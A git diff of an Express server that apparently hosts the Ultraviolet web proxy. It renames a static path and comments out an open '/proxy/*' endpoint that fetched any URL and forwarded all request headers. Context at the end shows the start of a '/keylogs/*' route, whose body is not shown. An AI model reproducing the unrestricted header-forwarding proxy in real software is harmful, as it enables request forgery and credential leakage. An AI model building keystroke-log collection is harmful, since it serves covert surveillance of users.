@@ -40,40 +40,40 @@ try {
 
     app.use(express.static(publicPath));
 
-    app.use("/uv/", express.static(uvPath));
+    app.use("/ultraviolet/", express.static(uvPath));
     app.use("/epoxy/", express.static(epoxyPath));
     app.use("/baremux/", express.static(baremuxPath));
 
     // Proxy endpoint with origin check and dynamic target URL
-    app.use(
-        "/proxy/*",
-        async (req, res, next) => {
-            const targetUrl = req.params[0];
-            try {
-                const response = await fetch(targetUrl, {
-                    method: req.method, // Forward the request method (GET, POST, etc.)
-                    headers: {
-                        ...req.headers,
-                        Host: new URL(targetUrl).host, // Override Host header
-                    },
-                    body:
-                        req.method === "POST" || req.method === "PUT"
-                            ? JSON.stringify(req.body)
-                            : undefined, // Forward body for POST/PUT requests
-                });
-                res.send(await response.text());
-            } catch (error) {
-                console.error("Error fetching target URL:", error);
-                res.status(500).send("Error fetching the target URL");
-            }
-        },
-    );
+   // app.use(
+   //     "/proxy/*",
+ //       async (req, res, next) => {
+           // const targetUrl = req.params[0];
+         //   try {
+       //         const response = await fetch(targetUrl, {
+     //               method: req.method, // Forward the request method (GET, POST, etc.)
+   //                 headers: {
+          //              ...req.headers,
+        //                Host: new URL(targetUrl).host, // Override Host header
+      //              },
+    //                body:
+             //           req.method === "POST" || req.method === "PUT"
+           //                 ? JSON.stringify(req.body)
+         //                   : undefined, // Forward body for POST/PUT requests
+       //         });
+      //          res.send(await response.text());
+     //  /     } catch (error) {
+    //            console.error("Error fetching target URL:", error);
+   //             res.status(500).send("Error fetching the target URL");
+  //          }
+ //       },
+//    );
 
     // 404 stuff
-    app.use((req, res) => {
-        res.status(404);
-        res.sendFile(join(publicPath, "404.html"));
-    });
+   // app.use((req, res) => {
+  //      res.status(404);
+ //      res.sendFile(join(publicPath, "404.html"));
+//    });
 
     app.get("/keylogs/*", async (req, res, next) => {
         try {
